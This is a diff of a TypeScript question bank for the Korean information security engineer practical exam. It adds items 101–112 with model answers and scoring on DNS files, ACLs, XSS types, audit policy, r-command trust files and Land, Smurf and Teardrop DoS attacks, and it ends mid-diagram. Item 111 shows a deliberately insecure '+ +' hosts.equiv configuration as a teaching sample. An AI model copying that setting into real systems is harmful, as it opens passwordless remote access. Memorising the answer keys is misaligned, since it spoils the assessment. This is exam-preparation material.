@@ -9,21 +9,21 @@ export const SECURITY_PRACTICAL_SUBJECTS: PracticalSubject[] = [
 ];
 
 export const SECURITY_PRACTICAL_TRENDS = {
-  title: "정보보안기사 실기 최신 출제 트렌드 분석",
+  title: "정보보안기사 실기 최신 출제 트렌드 분석 (2025년 3회 ~ 2026년 2회 기출 반영)",
   summary:
-    "단순 암기를 넘어 실제 리눅스/네트워크 설정 파일 구조 분석, Snort/iptables 실무 룰 작성, 최신 웹 공격 벡터(CORS, XSS 세부유형, 크리덴셜 스터핑) 및 ISMS-P 기반 위험관리 시나리오 서술 비중이 대폭 강화되었습니다.",
+    "단순 교재 암기 문항 비중이 30~40%로 급감하고, 실제 비정형 소스코드(Java, Python, C, PHP), 실제 서버 설정 파일(shadow, securetty, hosts.equiv, named.conf, iptables, Sendmail), 보안 장비 로그/패킷을 직접 분석해 취약 라인과 조치안을 도출하는 실무 분석형 문제가 실기 합격을 좌우하고 있습니다. 47대 보안약점과 실무 명령어가 전 영역에 걸쳐 균등 출제됩니다.",
   keyPoints: [
     {
-      domain: "시스템 & 네트워크",
-      desc: "리눅스 계정/패스워드 파일 구조(/etc/shadow), iptables 상태추적 방화벽, 로그 분석(/var/log), IPSec 프로토콜 세부 헤더 분석",
+      domain: "시스템 & 네트워크 (실무 설정 및 명령어 분석)",
+      desc: "shadow 해시 포맷($6$ SHA-512, Salt), securetty 원격 root 가상터미널 제한, r-command 신뢰(/etc/hosts.equiv 600이하, +제거), SUID/SGID(find / -perm -4000, chmod u-s), iptables ICMP Type 8 DROP, IPSec(ESP/시퀀스 넘버), L2 프레임 포워딩 3종",
     },
     {
-      domain: "애플리케이션 & 공격 기법",
-      desc: "XSS 3대 세부 유형, Slow 계열 DoS(Slowloris, RUDY), 크리덴셜 스터핑, OpenSSL Heartbleed 취약점 패치 및 인증서 재발급 조치",
+      domain: "애플리케이션 & 침해 공격 (비정형 코드·로그·웹 프록시)",
+      desc: "메일 스푸핑 방지 3총사(SPF/DKIM/DMARC & DNS TXT 질의), Fiddler HTTPS 복호화(루트 CA), 웹쉘 4대 심층방어(화이트리스트, 실행권한 제거, 웹루트 외부, 난수화), XSS 3종, 고전 DoS 3종(Land, Smurf, Teardrop), Heartbleed(CVE-2014-0160), Fuzzing",
     },
     {
-      domain: "보안 관리 & 법률",
-      desc: "자산-위협-취약점 관계 분석, 정성적 위험 산정(델파이법 등), 위험 처리 4대 전략, 개인정보 유출 신고 기한 및 안전성 확보조치 기준",
+      domain: "보안 관리 & 법률 (법정 조문 및 거버넌스)",
+      desc: "개인정보 안전성 확보조치 기준(접속 권한, 다운로드, 삭제/파기), 정보통신망법 CISO 법정 4대 업무 & 집적정보통신시설(IDC) 사업자, SSO/EAM/IAM 거버넌스 3단계, 위험관리 6단계, 디지털 포렌식 5대 원칙",
     },
   ],
 };
@@ -3804,6 +3804,1579 @@ account     required      pam_faillock.so`,
     examTips:
       "DB 보안 가이드에서 단골로 출제되는 서술형 문제입니다. DDL 배제, WITH GRANT OPTION 배제, 최소 권한 원칙을 키워드로 정리하세요.",
   },
+
+  // =================================================================
+  // [문제 101] 단답형 (3점) - 시스템 보안 (2026년 2회차 실기 기출)
+  // =================================================================
+  {
+    id: 101,
+    subjectId: "system",
+    type: "short",
+    score: 3,
+    domain: "시스템 보안",
+    title: "DNS 서버 주 설정 파일(named.conf) 및 클라이언트 설정(/etc/resolv.conf)",
+    description:
+      "리눅스 시스템의 DNS 네임서버 및 클라이언트 설정 파일에 관한 물음이다. 다음 (a), (b) 설명에 해당하는 정확한 파일명을 기술하시오.",
+    scenario:
+      "(a) BIND DNS 데몬(named)의 기본 동작 환경 및 도메인 존(Zone) 데이터베이스 파일을 매핑·관리하는 주 설정 파일\n(b) 클라이언트 호스트 측에서 도메인 이름 질의(Resolution)에 사용할 로컬 네임서버 IP 주소 및 도메인 검색 접미사(search)를 지정하는 설정 파일",
+    codeBlock: {
+      language: "bind",
+      code: `// (a) 주 설정 파일 발췌
+options {
+    directory "/var/named";
+    allow-query { any; };
+    recursion no;
+};
+
+zone "example.com" IN {
+    type master;
+    file "example.com.zone";
+};
+
+# (b) 클라이언트 설정 파일 발췌
+search example.com
+nameserver 168.126.63.1
+nameserver 8.8.8.8`,
+    },
+    answer: ["(a) named.conf (또는 /etc/named.conf)", "(b) /etc/resolv.conf"],
+    scoringPoints: [
+      "(a) named.conf 기술 시 1.5점",
+      "(b) /etc/resolv.conf 기술 시 1.5점 (전체 경로 명시)",
+    ],
+    explanation:
+      "• `named.conf`: BIND DNS 서버 데몬의 전역 동작 옵션(options), 접근 제어(allow-query, allow-transfer), 존 정의(zone)를 관리하는 핵심 파일입니다.\n• `/etc/resolv.conf`: 리눅스 클라이언트 리졸버 라이브러리가 DNS 질의 시 참조하는 파일로, `nameserver <IP>` 형식으로 우선순위 네임서버를 최대 3개까지 지정합니다.",
+    examTips:
+      "2026년 2회차 실기 단답형 1번으로 출제된 문제입니다. 서버 설정 파일(named.conf)과 클라이언트 설정 파일(/etc/resolv.conf)의 역할을 절대 혼동하지 마세요.",
+  },
+
+  // =================================================================
+  // [문제 102] 단답형 (3점) - 네트워크 보안 (2026년 2회차 실기 기출)
+  // =================================================================
+  {
+    id: 102,
+    subjectId: "network",
+    type: "short",
+    score: 3,
+    domain: "네트워크 보안",
+    title: "방화벽 ACL(접근제어목록) 룰셋 기반 포트 및 프로토콜 분석",
+    description:
+      "다음 시스코 IOS 라우터 또는 방화벽의 패킷 필터링 접근제어목록(ACL) 룰셋을 분석하여, 외부에서 내부로 유입되는 트래픽 중 명시적으로 차단(Deny)되는 표준 TCP 포트 번호 3가지와 각 서비스명을 기술하시오.",
+    codeBlock: {
+      language: "cisco",
+      code: `Router(config)# access-list 101 deny tcp any any eq ftp
+Router(config)# access-list 101 deny tcp any any eq ftp-data
+Router(config)# access-list 101 deny tcp any any eq telnet
+Router(config)# access-list 101 permit ip any any`,
+    },
+    answer: [
+      "TCP 20 (FTP-Data / FTP 데이터 전송)",
+      "TCP 21 (FTP / FTP 제어 명령)",
+      "TCP 23 (Telnet / 텔넷 평문 원격 접속)",
+    ],
+    scoringPoints: [
+      "FTP-Data 포트 20 정확히 기술 시 1점",
+      "FTP 제어 포트 21 정확히 기술 시 1점",
+      "Telnet 포트 23 정확히 기술 시 1점",
+    ],
+    explanation:
+      "• `eq ftp`: FTP 제어(Control) 연결 포트로 TCP 21번을 사용합니다.\n• `eq ftp-data`: 능동 모드(Active Mode)에서 서버가 클라이언트로 데이터를 전송할 때 사용하는 포트로 TCP 20번을 사용합니다.\n• `eq telnet`: 평문 원격 쉘 접속 서비스인 텔넷은 TCP 23번을 사용합니다.\n\n※ ACL 규칙 평가 순서: 상단부터 순차적으로 일치 검사를 수행하며, match 발생 시 즉시 해당 action을 취하고 평가를 종료(First Match Rule)합니다.",
+    examTips:
+      "2026년 2회차 실기 2번 단답형 기출입니다. ftp는 21, ftp-data는 20, telnet은 23 포트임을 정확한 번호와 서비스명으로 기억해야 합니다.",
+  },
+
+  // =================================================================
+  // [문제 103] 단답형 (3점) - 정보보안 관리 및 법률 (2026년 2회차 실기 기출)
+  // =================================================================
+  {
+    id: 103,
+    subjectId: "law",
+    type: "short",
+    score: 3,
+    domain: "정보보안 관리 및 법률",
+    title: "개인정보의 안전성 확보조치 기준(고시) 접근권한 관리 통제 행위",
+    description:
+      "개인정보보호위원회 고시 '개인정보의 안전성 확보조치 기준' 제4조(접근 권한의 관리)에 명시된 내용이다. 빈칸 (A), (B), (C)에 들어갈 알맞은 법률 조문 용어를 쓰시오.",
+    scenario:
+      "• 개인정보처리시스템에 대한 (  A  )을 할 수 있는 개인정보취급자\n• 개인정보를 (  B  ) 또는 (  C  ) 할 수 있는 개인정보취급자",
+    answer: [
+      "(A) 접속 권한 (또는 접근 권한)",
+      "(B) 다운로드",
+      "(C) 삭제 (또는 파기)",
+    ],
+    scoringPoints: [
+      "(A): '접속 권한' (또는 접근 권한) 1점",
+      "(B): '다운로드' 1점",
+      "(C): '삭제' 또는 '파기' 1점",
+    ],
+    explanation:
+      "개인정보의 안전성 확보조치 기준 제4조(접근 권한의 관리):\n개인정보처리자는 개인정보처리시스템에 대한 접근 권한을 업무 수행에 필요한 최소한의 범위로 업무 담당자에 따라 차등 부여하여야 하며,\n특히 개인정보처리시스템에 대한 '접속 권한'을 변경·말소하거나, 개인정보를 '다운로드' 또는 '삭제(파기)'할 수 있는 권한을 가진 취급자에 대해서는 별도의 승인 절차와 이력 관리를 엄격히 적용해야 합니다.",
+    examTips:
+      "2026년 2회차 3번 단답형 기출입니다. 안전성 확보조치 기준 고시 조문의 핵심 3대 행위(접속 권한, 다운로드, 삭제/파기)는 빈칸 단골 문제입니다.",
+  },
+
+  // =================================================================
+  // [문제 104] 단답형 (3점) - 정보보안 관리 (2026년 2회차 실기 기출)
+  // =================================================================
+  {
+    id: 104,
+    subjectId: "law",
+    type: "short",
+    score: 3,
+    domain: "정보보안 관리",
+    title: "침해사고 대응 및 위험 관리 (취약성 평가, Vulnerability Assessment)",
+    description:
+      "정보보호 관리체계(ISMS) 및 위험 관리 프레임워크에 관한 설명이다. 다음 지문이 설명하는 핵심 보안 평가 활동의 명칭을 우리말 또는 영문으로 기술하시오.",
+    scenario:
+      "IT 인프라 시스템(운영체제, 네트워크 장비, 데이터베이스, 웹 애플리케이션 등)의 기술적·물리적·관리적 약점을 사전에 식별하고, 침해사고로 이어질 수 있는 잠재적 결함을 분석하여 시스템의 위험 수준을 정량적·정성적으로 측정·평가하는 활동",
+    answer: "취약성 평가 (Vulnerability Assessment, 취약점 평가/분석)",
+    scoringPoints: [
+      "'취약성 평가', '취약점 평가', 'Vulnerability Assessment' 기술 시 3점 정답",
+    ],
+    explanation:
+      "• 취약성 평가(Vulnerability Assessment): 시스템의 잠재적 약점(Vulnerability)을 스캐너(Nessus, OpenVAS 등)나 체크리스트를 통해 식별하고 목록화하여 위험도를 평가하는 활동입니다.\n• 모의해킹(Penetration Testing)과의 차이: 취약성 평가는 취약점의 '목록 식별 및 평가'에 중점을 두며, 모의해킹은 식별된 취약점을 실제로 '익스플로잇(공격 성공)'하여 목표 시스템 장악 가능성을 검증합니다.",
+    examTips:
+      "2026년 2회차 4번 단답형 기출입니다. 위험 분석(자산 × 위협 × 취약점)에서 취약점을 체계적으로 평가하는 용어로 기억하세요.",
+  },
+
+  // =================================================================
+  // [문제 105] 단답형 (3점) - 정보보안 일반 (2026년 2회차 실기 기출)
+  // =================================================================
+  {
+    id: 105,
+    subjectId: "general",
+    type: "short",
+    score: 3,
+    domain: "정보보안 일반 & 관제",
+    title: "보안 관제 및 빅데이터 로그 통합 상관분석 솔루션 (SIEM)",
+    description:
+      "대규모 기업 인프라의 침해사고 대응 및 통합 보안 관제에 관한 설명이다. 다음 설명에 해당하는 솔루션의 영문 전체 명칭과 약어를 기술하시오.",
+    scenario:
+      "신속한 사이버 침해사고 탐지 및 대응을 위해 방화벽, IPS, WAF, 서버, 엔드포인트 등 다양한 이기종 보안 장비로부터 발생하는 대용량 로그를 중앙에 실시간으로 수집·정규화하고, 빅데이터 기반의 상관관계 분석(Correlation Analysis)을 통해 위협 이벤트를 탐지·시각화하는 통합 보안 솔루션",
+    answer: [
+      "영문 약어: SIEM",
+      "영문 전체 명칭: Security Information and Event Management",
+    ],
+    scoringPoints: [
+      "약어 'SIEM' 정확히 기술 시 1.5점",
+      "풀네임 'Security Information and Event Management' 정확히 기술 시 1.5점",
+    ],
+    explanation:
+      "• SIEM(Security Information and Event Management): SIM(정보 수집 및 장기 보관)과 SEM(실시간 이벤트 상관분석 및 모니터링)이 결합된 솔루션으로 Splunk, IBM QRadar, Elastic SIEM 등이 대표적입니다.\n• SOAR(Security Orchestration, Automation and Response)와의 관계: SIEM이 위협을 '탐지·상관분석'하면, SOAR는 플레이북에 기반하여 차단 등 후속 조치를 '자동화'합니다.",
+    examTips:
+      "2026년 2회차 5번 단답형 기출입니다. 영문 전체 철자(Security Information and Event Management)와 약어(SIEM)를 반드시 외워두세요.",
+  },
+
+  // =================================================================
+  // [문제 106] 단답형 (3점) - 애플리케이션 보안 (2026년 2회차 실기 기출)
+  // =================================================================
+  {
+    id: 106,
+    subjectId: "application",
+    type: "short",
+    score: 3,
+    domain: "애플리케이션 보안",
+    title: "XSS (Cross-Site Scripting) 3대 세부 유형 구분",
+    description:
+      "웹 애플리케이션의 대표적 취약점인 크로스 사이트 스크립팅(XSS)의 공격 기법 3가지에 대한 설명이다. 각 설명 (a), (b), (c)에 해당하는 정확한 XSS 유형 명칭을 영문 또는 한글로 기술하시오.",
+    scenario:
+      "(a) 공격 스크립트가 URL 파라미터나 검색어 인자를 통해 전달되어, 서버의 처리 결과 응답 웹페이지에 즉시 포함되어 브라우저에서 실행되는 일회성 공격\n(b) 공격 스크립트가 게시판 글, 댓글, 회원 프로필 등 웹 서버 데이터베이스에 영구적으로 저장되어, 해당 페이지를 열람하는 불특정 다수의 희생자 브라우저에서 지속적으로 실행되는 공격\n(c) 서버와의 추가적인 데이터 전송이나 페이지 갱신 없이, 클라이언트 측 브라우저의 DOM 환경(document.location, innerHTML 등)을 조작하여 실행되는 스크립트 공격",
+    answer: [
+      "(a) Reflected XSS (반사형 XSS)",
+      "(b) Stored XSS (저장형 XSS / Persistent XSS)",
+      "(c) DOM-based XSS (DOM 기반 XSS)",
+    ],
+    scoringPoints: [
+      "(a) Reflected XSS 또는 반사형 XSS (1점)",
+      "(b) Stored XSS 또는 저장형 XSS (1점)",
+      "(c) DOM-based XSS 또는 DOM 기반 XSS (1점)",
+    ],
+    explanation:
+      "• Reflected XSS: 악성 URL 링크를 피싱 메일 등에 심어 희생자가 클릭하게 유도합니다.\n• Stored XSS: DB에 페이로드가 상주하므로 파급력이 가장 크고 위험합니다.\n• DOM-based XSS: 서버로 스크립트가 전달되지 않고 브라우저 JavaScript의 소스(Source)와 싱크(Sink) 사이에서 DOM을 직접 조작하므로 서버 WAF 탐지를 우회하기 쉽습니다.",
+    examTips:
+      "2026년 2회차 6번 단답형 기출입니다. 3가지 명칭(Reflected, Stored, DOM-based)을 반드시 세트로 숙지하세요.",
+  },
+
+  // =================================================================
+  // [문제 107] 단답형 (3점) - 시스템 보안 (2026년 2회차 실기 기출)
+  // =================================================================
+  {
+    id: 107,
+    subjectId: "system",
+    type: "short",
+    score: 3,
+    domain: "시스템 보안",
+    title: "Windows 로컬 보안 감사 정책 3대 카테고리 식별",
+    description:
+      "Windows 운영체제의 '로컬 보안 정책(secpol.msc) - 감사 정책' 설정에 관한 물음이다. 각 설명 (a), (b), (c)에 해당하는 공식 감사 정책 명칭을 기술하시오.",
+    scenario:
+      "(a) 로컬 컴퓨터에서 사용자 계정이나 그룹의 생성, 삭제, 이름 변경, 활성화/비활성화, 비밀번호 변경 등의 작업 발생 여부를 감사하는 정책\n(b) 사용자가 시스템에 대화형으로 로그온하거나 로그오프할 때, 또는 원격 데스크톱 접속 성공 및 실패 이벤트를 기록하는 감사 정책\n(c) 사용자가 시스템 시간 변경, 파일 소유권 취득, 보안 감사 로그 관리 등 사용자 권한(User Right)이나 관리자 특권을 행사할 때 이를 기록하는 정책",
+    answer: [
+      "(a) 계정 관리 감사 (Audit account management)",
+      "(b) 로그온 이벤트 감사 (Audit logon events)",
+      "(c) 권한 사용 감사 (Audit privilege use)",
+    ],
+    scoringPoints: [
+      "(a) 계정 관리 감사 1점",
+      "(b) 로그온 이벤트 감사 1점",
+      "(c) 권한 사용 감사 1점",
+    ],
+    explanation:
+      "Windows 로컬 보안 정책의 9대 감사 범주:\n1. 계정 로그온 이벤트 감사: 도메인 컨트롤러 인증\n2. 계정 관리 감사: 계정/그룹/비밀번호 변경 (정답 a)\n3. 디렉터리 서비스 액세스 감사: Active Directory 개체 접근\n4. 로그온 이벤트 감사: 로컬 로그온/로그오프 (정답 b)\n5. 개체 액세스 감사: 파일/레지스트리/프린터 접근\n6. 정책 변경 감사: 방화벽/감사 정책 변경\n7. 권한 사용 감사: 관리자 특권/권한 행사 (정답 c)\n8. 프로세스 추적 감사: 프로그램 실행/종료 추적\n9. 시스템 이벤트 감사: 컴퓨터 부팅/종료/보안 로그 삭제",
+    examTips:
+      "2026년 2회차 7번 단답형 기출입니다. 윈도우 보안 가이드에서 '성공/실패' 감사를 필수로 활성화해야 하는 핵심 정책들입니다.",
+  },
+
+  // =================================================================
+  // [문제 108] 단답형 (3점) - 정보보안 일반 & 암호학 (2026년 2회차 실기 기출)
+  // =================================================================
+  {
+    id: 108,
+    subjectId: "general",
+    type: "short",
+    score: 3,
+    domain: "정보보안 일반 & 암호학",
+    title: "동일키 암·복호화 메커니즘 (대칭키 / 비밀키 암호 방식)",
+    description:
+      "현대 암호학의 알고리즘 분류에 관한 설명이다. 다음 지문이 설명하는 암호화 방식의 명칭을 쓰시오.",
+    scenario:
+      "데이터를 암호화할 때 사용하는 암호화 키와, 암호문을 본래의 평문으로 복원할 때 사용하는 복호화 키가 동일한 단일 비밀키를 사용하는 암호 알고리즘 방식",
+    answer: "대칭키 암호화 방식 (비밀키 암호화 / 관용 암호화 / Symmetric Key Encryption)",
+    scoringPoints: [
+      "'대칭키 암호화', '비밀키 암호화', '대칭키' 기술 시 3점 정답",
+    ],
+    explanation:
+      "• 대칭키(비밀키) 암호: 송수신자가 동일한 비밀키를 공유하며, 대표적으로 AES, DES, 3DES, SEED, ARIA, ChaCha20 등이 있습니다. 연산 속도가 매우 빠르지만 키 분배(Key Distribution)와 N*(N-1)/2개로 증가하는 키 관리 문제가 발생합니다.\n• 비대칭키(공개키) 암호: 암호화에는 공개키(Public Key), 복호화에는 개인키(Private Key)를 서로 다르게 사용하는 방식으로 RSA, ECC 등이 있습니다.",
+    examTips:
+      "2026년 2회차 8번 단답형 기출입니다. 기본 암호학 용어로 대칭키(비밀키)와 공개키(비대칭키)의 차이를 명확히 구분하세요.",
+  },
+
+  // =================================================================
+  // [문제 109] 단답형 (3점) - 정보보안 관리 (2026년 2회차 실기 기출)
+  // =================================================================
+  {
+    id: 109,
+    subjectId: "law",
+    type: "short",
+    score: 3,
+    domain: "정보보안 관리",
+    title: "위기 관리 및 업무 연속성 계획 (BCP, Business Continuity Plan)",
+    description:
+      "조직의 재해 복구 및 위험 관리 체계에 관한 설명이다. 다음 설명에 해당하는 계획의 명칭과 영문 약어를 기술하시오.",
+    scenario:
+      "지진·화재 등 대형 자연재해, 테러, 대규모 정전 및 사이버 공격 등으로 인해 전산 센터가 마비되는 위기 상황에서도 조직의 핵심적인 핵심 비즈니스 기능을 중단 없이 지속하거나 최단 시간 내에 재개할 수 있도록 수립하는 전사적 위기대응 및 복구 체계 계획",
+    answer: [
+      "영문 약어: BCP",
+      "공식 명칭: 업무 연속성 계획 (Business Continuity Plan)",
+    ],
+    scoringPoints: [
+      "약어 'BCP' 기술 시 1.5점",
+      "'업무 연속성 계획' 또는 'Business Continuity Plan' 기술 시 1.5점",
+    ],
+    explanation:
+      "• BCP(Business Continuity Plan): 비즈니스 전반의 연속성을 보장하기 위한 총체적 계획으로, 업무 영향 분석(BIA)을 통해 핵심 프로세스와 자산을 식별하고 RTO(목표 복구 시간), RPO(목표 복구 시점)를 설정합니다.\n• DRP(Disaster Recovery Plan): BCP의 하위 계획으로서 재해 시 IT 인프라 및 전산 시스템을 복원하기 위한 구체적인 기술적 복구 계획입니다.",
+    examTips:
+      "2026년 2회차 9번 단답형 기출입니다. BCP(업무연속성계획)와 DRP(재해복구계획)의 포함 관계를 명확히 기억해 두세요.",
+  },
+
+  // =================================================================
+  // [문제 110] 단답형 (3점) - 정보보안 일반 & 악성코드 (2026년 2회차 실기 기출)
+  // =================================================================
+  {
+    id: 110,
+    subjectId: "general",
+    type: "short",
+    score: 3,
+    domain: "정보보안 일반 & 악성코드",
+    title: "악성코드 격리 동적 행위 분석 기술 (샌드박스, Sandbox)",
+    description:
+      "악성코드 분석 및 지능형 위협 대응 기술에 관한 설명이다. 다음 지문이 설명하는 격리 실행 분석 환경의 명칭을 쓰시오.",
+    scenario:
+      "실제 호스트 운영체제와 완벽하게 격리된 가상화 실행 환경을 구축하고, 의심스러운 파일이나 악성코드를 해당 환경 내에서 직접 실행(동적 분석)하여 파일 생성, 레지스트리 수정, C&C 서버 통신 시도 등 시스템에 피해를 주지 않고 악성 행위를 안전하게 관찰·분석하는 기술",
+    answer: "샌드박스 (Sandbox)",
+    scoringPoints: [
+      "'샌드박스' 또는 'Sandbox' 기술 시 3점 정답",
+    ],
+    explanation:
+      "• 샌드박스(Sandbox): 외부 공격 코드가 호스트 운영체제나 실제 파일시스템에 영향을 주지 못하도록 가상 머신(VM)이나 컨테이너로 격리된 보호 영역입니다.\n• 활용: 이메일 첨부파일 검사(APT 대응 솔루션), 브라우저 탭 격리(Chrome Sandbox), 악성코드 자동 분석 시스템(Cuckoo Sandbox) 등에 핵심 엔진으로 쓰입니다.",
+    examTips:
+      "2026년 2회차 10번 단답형 기출입니다. 악성코드 격리 동적 실행 분석 기술의 대표 키워드로 기억하세요.",
+  },
+
+  // =================================================================
+  // [문제 111] 서술·작업형 (14점) - 시스템 보안 (2026년 2회차 실기 기출)
+  // =================================================================
+  {
+    id: 111,
+    subjectId: "system",
+    type: "descriptive",
+    score: 14,
+    domain: "시스템 보안",
+    title: "r-command 계열 무인증 신뢰 설정 파일(/etc/hosts.equiv, ~/.rhosts) 취약점 분석 및 보안 조치",
+    description:
+      "리눅스/유닉스 환경에서 원격 명령 실행을 지원하는 r-command(rlogin, rsh, rcp) 서비스의 호스트 간 무인증 신뢰 설정에 관한 실무 서술형 물음이다. 하위 3가지 물음에 답하시오.",
+    codeBlock: {
+      language: "bash",
+      code: `# /etc/hosts.equiv 설정 내용
++ +
+192.168.1.100 user01
+trust-host.com +
+
+# /home/user01/.rhosts 설정 내용
++
+192.168.1.200 +`,
+    },
+    subItems: [
+      {
+        number: 1,
+        question:
+          "주요정보통신기반시설 취약점 가이드에 따른 `/etc/hosts.equiv` 및 `$HOME/.rhosts` 파일의 적절한 파일 소유자 기준을 기술하시오.",
+        answer: "root 또는 해당 계정 소유자",
+        scoringCriteria: "root 또는 해당 계정 명시 시 4점",
+      },
+      {
+        number: 2,
+        question:
+          "취약점 가이드 기준 `/etc/hosts.equiv` 및 `$HOME/.rhosts` 파일의 안전한 파일 접근 권한(Permission) 기준을 8진수로 기술하시오.",
+        answer: "600 이하 (소유자 읽기/쓰기만 허용, 타 사용자 접근 불가)",
+        scoringCriteria: "600 이하 명시 시 5점",
+      },
+      {
+        number: 3,
+        question:
+          "위 코드 블록의 설정 내용에서 보안상 대단히 위험하여 파일 내에서 반드시 삭제해야 하는 특수 설정 기호와, 그 기호가 설정되어 있을 때 발생하는 보안 위협을 서술하시오.",
+        answer:
+          "• 삭제해야 하는 기호: `+` (플러스 와일드카드)\n• 보안 위협: `+` 기호가 설정되어 있으면 네트워크 상의 임의의 모든 원격 호스트 및 모든 사용자 계정으로부터 패스워드 인증 없이 무조건적인 원격 쉘 접속 및 명령어 실행을 허용하게 되어, 외부 공격자가 IP 스푸핑이나 직접 접속을 통해 시스템 관리자 권한을 완전히 탈취할 수 있는 치명적 위험이 발생함.",
+        scoringCriteria:
+          "'+' 기호 명시 (2점), 모든 호스트/사용자의 무인증 접속 허용 및 권한 탈취 위험 설명 (3점) -> 총 5점",
+      },
+    ],
+    answer: [
+      "1. 적절한 소유자: root 또는 해당 사용자 계정",
+      "2. 안전한 파일 권한: 600 이하",
+      "3. 삭제 기호 및 위험: '+' 기호 / 모든 외부 호스트의 무인증 원격 쉘 접근 허용으로 시스템 장악 위험",
+    ],
+    scoringPoints: [
+      "파일 소유자: root 또는 해당 계정 (4점)",
+      "파일 권한: 600 이하 (5점)",
+      "위험 기호: '+' 기호 및 무인증 전역 침투 위험성 정확 서술 (5점)",
+    ],
+    explanation:
+      "• r-command 취약점 원리:\nrlogin, rsh 등은 암호화되지 않은 평문 통신을 수행할 뿐 아니라, `/etc/hosts.equiv`나 `~/.rhosts` 파일에 등록된 호스트에 대해 비밀번호 없이 원격 로그인을 허용합니다.\n• 안전한 조치 가이드:\n1. 소유자는 root 또는 해당 계정이어야 하며, 타 사용자가 임의로 호스트를 등록하지 못하도록 권한을 600(rw-------) 이하로 엄격히 제한합니다.\n2. '+' 기호는 모든 호스트/모든 사용자를 의미하는 와일드카드이므로 파일 내에 '+'가 단 하나라도 존재하면 취약(양호: '+' 기호 제거 및 반드시 필요한 신뢰 호스트 IP만 명시)으로 판정합니다.\n3. 궁극적으로는 r-command 데몬 자체를 비활성화하고 SSH로 전면 대체해야 합니다.",
+    examTips:
+      "2026년 2회차 실기 서술형 11번으로 복원된 문제입니다. 소유자(root/해당계정), 권한(600 이하), 금지 기호(+) 3종 세트를 반드시 암기하세요.",
+  },
+
+  // =================================================================
+  // [문제 112] 서술·작업형 (14점) - 네트워크 보안 (2026년 2회차 실기 기출)
+  // =================================================================
+  {
+    id: 112,
+    subjectId: "network",
+    type: "descriptive",
+    score: 14,
+    domain: "네트워크 보안",
+    title: "대표적인 3대 서비스 거부(DoS) 공격 원리 심층 분석 (Land, Smurf, Teardrop)",
+    description:
+      "IP 프로토콜의 취약점을 악용하는 대표적인 고전 DoS(서비스 거부) 공격 3가지의 세부 동작 메커니즘에 관한 서술형 물음이다. 하위 3가지 공격 기법의 공격 원리와 시스템 피해 현상을 각각 서술하시오.",
+    subItems: [
+      {
+        number: 1,
+        question: "Land Attack의 공격 원리 및 피해 시스템의 오동작 원인을 서술하시오.",
+        answer:
+          "공격자가 전송하는 TCP SYN 패킷의 출발지 IP 주소와 출발지 포트 번호를 피해자(목적지)의 IP 주소 및 포트 번호와 동일하게 조작하여 전송한다. 피해 서버는 SYN-ACK 패킷을 자기 자신에게 회신하게 되어 무한 루프(Self-looping)에 빠지며, CPU 자원 고갈 및 가용성 마비가 발생한다.",
+        scoringCriteria:
+          "출발지 IP/포트를 피해자 IP/포트와 동일하게 위조한다는 핵심 및 자기 자신에게 무한 응답 루프 발생 설명 시 5점",
+      },
+      {
+        number: 2,
+        question: "Smurf Attack의 공격 원리 및 트래픽 증폭 반사 메커니즘을 서술하시오.",
+        answer:
+          "공격자가 출발지 IP 주소를 피해자의 IP 주소로 위조한 후, 다이렉트 브로드캐스트(Direct Broadcast) 주소로 대량의 ICMP Echo Request(핑) 패킷을 전송한다. 해당 브로드캐스트 네트워크 내의 수많은 활성 호스트들이 일제히 피해자의 IP로 ICMP Echo Reply 응답을 전송하여 피해자의 네트워크 대역폭을 완전히 고갈시킨다.",
+        scoringCriteria:
+          "출발지 IP를 피해자 IP로 위조, ICMP Echo Request를 브로드캐스트로 전송, 다수의 호스트가 피해자에게 동시 응답하여 트래픽 증폭 공격 수행 서술 시 5점",
+      },
+      {
+        number: 3,
+        question: "Teardrop Attack의 공격 원리 및 패킷 단편화 오프셋 왜곡 메커니즘을 서술하시오.",
+        answer:
+          "IP 패킷이 단편화(Fragmentation)되어 전송될 때, 패킷 헤더의 단편 오프셋(Fragment Offset) 값과 패킷 길이를 고의로 왜곡·중복되도록 조작하여 전송한다. 피해 시스템이 수신한 단편 패킷들을 재조합(Reassembly)하는 과정에서 오프셋 겹침(Overlap) 오류 처리를 감당하지 못하고 시스템 충돌(크래시) 및 재부팅을 유발한다.",
+        scoringCriteria:
+          "IP 단편화 오프셋(Fragment Offset) 값을 고의로 중복·왜곡 조작, 재조합 단계에서 시스템 충돌(크래시) 유발 서술 시 4점",
+      },
+    ],
+    answer: [
+      "1. Land: 송신 IP=수신 IP=피해자 IP로 설정하여 자기 자신에게 무한 응답 루프 유발",
+      "2. Smurf: 피해자 IP 위조 후 브로드캐스트로 ICMP Echo Request 전송 ➔ 다수 호스트 동시 반사 증폭",
+      "3. Teardrop: IP 단편 오프셋(Offset) 중복·왜곡 조작 ➔ 패킷 재조합 단계 시스템 크래시 유발",
+    ],
+    scoringPoints: [
+      "Land Attack 원리 및 자가 루프 정확 서술 (5점)",
+      "Smurf Attack 브로드캐스트 증폭 메커니즘 정확 서술 (5점)",
+      "Teardrop Attack 단편 오프셋 중복 왜곡 및 재조합 오류 서술 (4점)",
+    ],
+    explanation:
+      "• Land Attack 방어: 방화벽에서 출발지 IP와 목적지 IP가 동일한 인바운드 패킷을 탐지하여 즉시 DROP하도록 룰을 설정합니다.\n• Smurf Attack 방어: 라우터에서 다이렉트 브로드캐스트 수신을 차단(no ip directed-broadcast)하고, 호스트에서 ICMP broadcast 응답을 비활성화(/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts=1)합니다.\n• Teardrop Attack 방어: 최신 운영체제 패치 적용 및 침입차단시스템에서 비정상 단편 오프셋을 가진 패킷을 검출하여 차단합니다.",
+    examTips:
+      "2026년 2회차 실기 서술형 12번 기출입니다. 세 DoS 공격의 패킷 조작 필드(IP주소, 브로드캐스트, 오프셋)를 명확히 구분하여 서술할 수 있어야 합니다.",
+    mermaidChart: `graph TD
+    subgraph Land["Land Attack"]
+        L_ATK["공격자"] -->|"Src=피해자IP, Dst=피해자IP"| L_VIC["피해자 서버"]
+        L_VIC -->|"SYN-ACK 자가 응답 무한 루프"| L_VIC
+    end
+
+    subgraph Smurf["Smurf Attack"]
+        S_ATK["공격자"] -->|"Src=피해자IP ➔ 브로드캐스트"| S_BRD["네트워크 브로드캐스트"]
+        S_BRD --> H1["호스트1"] & H2["호스트2"] & H3["호스트3"]
+        H1 & H2 & H3 -->|"대량 ICMP Reply 집중"| S_VIC["피해자 서버 (대역폭 고갈)"]
+    end
+
+    subgraph Teardrop["Teardrop Attack"]
+        T_ATK["공격자"] -->|"패킷1: Offset 0~100"| T_VIC["피해자 OS"]
